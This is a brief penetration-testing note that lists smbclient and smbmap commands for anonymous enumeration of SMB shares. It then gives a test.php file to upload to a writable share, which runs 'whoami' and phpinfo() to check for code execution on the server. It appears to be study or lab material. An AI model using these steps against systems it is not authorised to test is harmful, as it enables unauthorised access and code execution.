refer to "smbclient" under tools linux

smbclient -L //< IP > -N

smbclient //< IP >/ < smb-share > -N

smbmap -H < IP >



if able to upload to smb share

try this test.php

```
<?php
    echo "<h1>SMB Upload Success!</h1>";
    echo "Current User: " . exec('whoami');
    phpinfo();
?>
```